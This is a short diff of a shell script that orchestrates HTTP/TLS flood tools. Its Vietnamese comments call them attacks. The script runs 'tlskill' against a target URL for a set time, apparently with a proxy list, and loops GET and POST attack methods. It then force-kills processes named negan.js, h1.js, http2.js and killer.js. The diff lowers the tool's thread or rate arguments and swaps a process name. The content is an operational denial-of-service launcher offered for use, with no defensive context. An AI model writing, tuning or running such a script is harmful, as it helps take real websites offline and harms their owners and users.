@@ -36,7 +36,7 @@ wait
 
 export NODE_OPTIONS=--max-old-space-size=8192
 
-node tlskill "$URL" "$TIME" 10 10 live.txt &
+node tlskill "$URL" "$TIME" 1 1 live.txt &
 
 # Chạy tấn công với h1.js
 for method in GET POST; do 
@@ -46,4 +46,4 @@ done
 wait
 
 # Dừng tất cả tiến trình liên quan
-pgrep -f "negan.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js" | xargs -r kill -9
+pgrep -f "negan.js|h1.js|h1h2.js|http2.js|tlskill.js|killer.js" | xargs -r kill -9
